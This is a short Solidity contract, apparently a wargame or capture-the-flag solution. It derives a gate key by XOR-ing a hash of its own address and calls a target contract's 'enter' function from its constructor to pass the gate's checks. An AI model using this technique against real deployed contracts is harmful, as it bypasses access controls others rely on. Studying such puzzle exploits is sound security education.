// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Gate {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract Gateau {
  constructor(address target) {
    uint64 _sender = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
    uint64 _key = type(uint64).max ^ _sender;
    Gate(target).enter(bytes8(_key));
  }
}
